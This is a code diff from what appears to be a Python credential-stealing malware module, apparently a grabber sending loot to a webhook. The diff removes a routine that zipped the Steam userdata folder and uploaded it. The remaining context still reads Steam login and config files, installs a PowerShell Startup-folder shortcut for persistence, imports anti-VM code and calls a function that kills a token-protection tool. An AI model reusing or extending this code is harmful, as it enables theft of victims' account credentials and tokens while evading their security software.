@@ -2,8 +2,6 @@ import os
 import vdf
 import json
 import nukelib
-import zipfile
-import io
 
 from core.componets import extractor
 from core.componets import antivm
@@ -73,7 +71,6 @@ class Main:
 
         steamUsers = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "loginusers.vdf"))
         steamConfig = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "config.vdf"))
-        steamUserData_path = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "userdata"))
 
         if os.path.exists(steamUsers):
             with open(steamUsers, "r") as f:
@@ -83,18 +80,8 @@ class Main:
             with open(steamConfig, "r") as f:
                 steamConfigData = vdf.loads(f.read())
 
-        if os.path.exists(steamUserData_path):
-            buffer = io.BytesIO()
-            with zipfile.ZipFile(buffer, "w") as configzip:
-                for root, dirs, files in os.walk(steamUserData_path):
-                    for file in files:
-                        filePath = os.path.join(root, file)
-                        configzip.write(filePath, os.path.relpath(filePath, steamUserData_path))
-           
-            self.webhook.add_file(buffer.getvalue(), "steamUserData.zip")
-
         return steamUsersConf, steamConfigData;
-        
+
     def addStartup(self, linkname: str, pathExec: str):
         if not os.path.exists(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", linkname)):
             script = f"""
@@ -105,7 +92,6 @@ class Main:
             $shortcutFile.Save()
             """
             sysinfo.runPowershell(script)
-
 
     def token(self):
         extractor.Anti_tokenprotector.killprotector()
